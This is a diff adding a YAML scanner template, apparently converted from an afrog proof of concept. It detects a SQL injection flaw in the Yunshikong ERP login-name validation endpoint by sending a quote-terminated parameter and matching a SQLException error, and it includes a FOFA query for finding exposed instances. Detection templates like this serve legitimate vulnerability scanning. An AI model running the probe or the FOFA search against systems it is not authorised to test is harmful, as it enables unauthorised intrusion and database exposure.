@@ -1,0 +1,28 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - SQLException
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/sys/user/validateLoginName?loginName=admin'''
+id: yunshikong-erp-sql-injection
+info:
+  author: laohuan12138
+  description: |
+    云时空 社会化商业ERP系统存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息
+    fofa: title="云时空社会化商业ERP"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 云时空 社会化商业ERP系统存在SQL注入漏洞
+  severity: high
+  tags: yunshikong,erp,sql-injection,sqli,argus-import
